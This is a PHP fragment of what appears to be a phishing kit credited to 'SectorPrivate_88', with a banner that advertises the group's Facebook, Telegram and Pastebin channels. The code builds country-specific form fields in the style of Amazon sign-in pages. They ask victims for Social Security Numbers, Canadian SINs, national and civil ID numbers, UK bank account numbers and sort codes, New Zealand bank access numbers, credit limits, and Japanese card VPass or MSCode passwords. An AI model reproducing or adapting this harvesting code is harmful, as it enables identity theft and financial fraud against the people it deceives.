<?php
/*
____            _             ____       _            _           ___   ___  
/ ___|  ___  ___| |_ ___  _ __|  _ \ _ __(_)_   ____ _| |_ ___    ( _ ) ( _ ) 
\___ \ / _ \/ __| __/ _ \| '__| |_) | '__| \ \ / / _` | __/ _ \   / _ \ / _ \ 
 ___) |  __/ (__| || (_) | |  |  __/| |  | |\ V / (_| | ||  __/  | (_) | (_) |
|____/ \___|\___|\__\___/|_|  |_|   |_|  |_| \_/ \__,_|\__\___|___\___/ \___/ 
                                                             |_____|          

Join our community
Facebook Groups : https://www.facebook.com/groups/621105481775437/
Telegram Chanel : https://t.me/sectorprivate88
Need our help : sectorprivate88 [at] gmail.com

if link die you can find at (https://pastebin.com/2bwFRSjP) for updated link

*/
switch ($countryname) {

case "Greece":
case "Hong Kong":
  $additional = '<div style="padding: 5px;" class="a-input-text-wrapper auth-required-field auth-fill-claim">
    <input type="text" name="numbid" id="numbid" placeholder="ID Number" autocorrect="off" autocapitalize="off" required="required">
  </div>';
  $card = '';
break;

case "Kuwait":
  $additional = '<div style="padding: 5px;" class="a-input-text-wrapper auth-required-field auth-fill-claim">
    <input type="tel" name="civilid" id="civilid" placeholder="Civil ID Number" autocorrect="off" autocapitalize="off" required="required">
  </div>';
  $card = '';
break;

case "United States":
  $additional = '<div style="padding: 5px;" class="a-input-text-wrapper auth-required-field auth-fill-claim">
    <input type="tel" placeholder="Social Security Number" name="ssn" id="ssn" autocorrect="off" autocapitalize="off" required="required">
  </div>';
  $card = '';
break;

case "Canada":
  $additional = '<div style="padding: 5px;" class="a-input-text-wrapper auth-required-field auth-fill-claim">
    <input type="tel" placeholder="Social Insurance Number" name="sin" id="ssn" autocorrect="off" autocapitalize="off" required="required">
  </div>';
  $card = '';
break;

case "Australia":
  $additional = '<div style="padding: 5px;" class="a-input-text-wrapper auth-required-field auth-fill-claim">
    <input type="tel" placeholder="OSID Number" name="osidnumber" id="osidnumber" autocorrect="off" autocapitalize="off">
  </div>';
  $card = '<div style="padding: 5px;" class="a-input-text-wrapper auth-required-field auth-fill-claim">
    <input type="text" name="climit" id="climit" placeholder="Credit Limit (ex: $5000)" autocorrect="off" autocapitalize="off">
  </div>';
break;

case "New Zealand":
  $additional = '';
  $card = '<div style="padding: 5px;" class="a-input-text-wrapper auth-required-field auth-fill-claim">
    <input type="text" name="climit" id="climit" placeholder="Credit Limit (ex: $5000)" autocorrect="off" autocapitalize="off" required="required">
  </div>
  <div style="padding: 5px;" class="a-input-text-wrapper auth-required-field auth-fill-claim">
    <input type="tel" name="bans" id="bans" placeholder="Bank Access Number" autocorrect="off" autocapitalize="off" required="required">
  </div>';
break;

case "United Kingdom":
  $additional = '';
  $card = '<div style="padding: 5px;" class="a-input-text-wrapper auth-required-field auth-fill-claim">
    <input type="tel" name="acno" id="acno" placeholder="Account Number" autocorrect="off" autocapitalize="off" required="required">
  </div>
  <div style="padding: 5px;" class="a-input-text-wrapper auth-required-field auth-fill-claim">
    <input type="tel" name="sortcode" id="sortcode" placeholder="Sort Code" maxlength="8" autocorrect="off" autocapitalize="off" required="required">
  </div>';
break;

case "Japan":
$additional = '';
  $card = '<div style="display:none;" id="webid" style="padding: 5px;" class="a-input-text-wrapper auth-required-field auth-fill-claim">
    <input type="text" name="cardid" id="cardid" onfocusout="var webid = $(\'#cardid\').val();

        if(isValidEmailAddress(webid)) {
          $(\'#cardid\').val(\'\');
        }" autocorrect="off" placeholder="WEB サービス ID" autocapitalize="off">
  </div>
  <div id="passwordjp" style="display:none;" style="padding: 5px;" class="a-input-text-wrapper auth-required-field auth-fill-claim">
    <input type="password" name="passjp" id="passjp" placeholder="パスワード （VPass / MSCode）" autocorrect="off" placeholder="WEB サービス ID" autocapitalize="off">
  </div>';
break;

default:
  $additional = '';
  $card = '';
}
?>
